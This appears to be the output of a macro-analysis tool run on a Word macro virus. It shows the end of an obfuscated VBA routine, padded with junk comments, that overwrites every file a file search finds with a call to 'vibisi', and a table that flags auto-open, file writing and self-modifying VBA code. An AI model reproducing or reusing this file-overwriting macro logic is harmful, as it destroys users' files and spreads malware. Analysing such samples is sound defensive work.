 'ќЁрсѕҐијюйЫЮпЕщшДГЯЕЙГю¶єї¶аќ¦° ЄмПЬМ¦Е№єҐпЦСъКшХѕЖБэЭк­бткџ№іо®ке°­
 'ќЁрсѕҐијюйЫЮпЕщшДГЯЕЙГю¶єї¶аќ¦° ЄмПЬМ¦Е№єҐпЦСъКшХѕЖБэЭк­бткџ№іо®ке°­
Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True) 'ЧЖщµёОьќ«ІЩКЕА«ЭҐёіЪ·®щЈЈ¬ЬзАћЮбёкХ¤ИћАыычІЧ§эіжхЯЮМІдЄыш¤
 'ЧЖщµёОьќ«ІЩКЕА«ЭҐёіЪ·®щЈЈ¬ЬзАћЮбёкХ¤ИћАыычІЧ§эіжхЯЮМІдЄыш¤
codex = "call vibisi 'Кк©ыЗМэИлжщ§с¤©ЦюлЕ¶«Йв№Ґ¶©іїџфИюўојџЩо«міхрмпЎ·ПЖчФпгЎфїБЁґј§гмВИы© "
 '¤щ§ЛЛкµгП«ЙьэцСИ§ЛЮѕЅмДЫЫЁРджЖСлўЭьфАзИоЄБМйсѕћШмчгњсиќБибцБЛ«ПѕъЗБїрбН§
 '¤щ§ЛЛкµгП«ЙьэцСИ§ЛЮѕЅмДЫЫЁРджЖСлўЭьфАзИоЄБМйсѕћШмчгњсиќБибцБЛ«ПѕъЗБїрбН§
f.write codex '¦ФС¦¶іо«Єј©¬ћЬЎУ¬§бЇ№іФжы¤¶ФН№щЙцУБ­АЎњЭПСРяС¬ѕ¬ц¬еРю­иўё»ьЅС¤кґМэбО
 '®хИоБ°ЫЬЛњгжщ§ЭхВрыґ№эдЇДНЗќтЈМ­±ЅПИћиЗоёС°ўЭчЕ¦ёУХҐЧЙЄАЪЯѕш±сбхъИјЧнЭ
Next 'ЫІъї±цїРєЯд¦±ех№№ґнц¤м©б°бЛОҐпЙ§ѕУТпюЎФу·ЯњКМмўв¶бИ­оцхёсТСВЇ¶т
 'ЫІъї±цїРєЯд¦±ех№№ґнц¤м©б°бЛОҐпЙ§ѕУТпюЎФу·ЯњКМмўв¶бИ­оцхёсТСВЇ¶т
End Sub 'эЧвёЅЄу њќЕиШзјБКньй§ЈБгМЁКЛщѕк·эа°Лг®ґК«Ѕ¬ВЁ уК РЛёГзбЭьоъ·
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

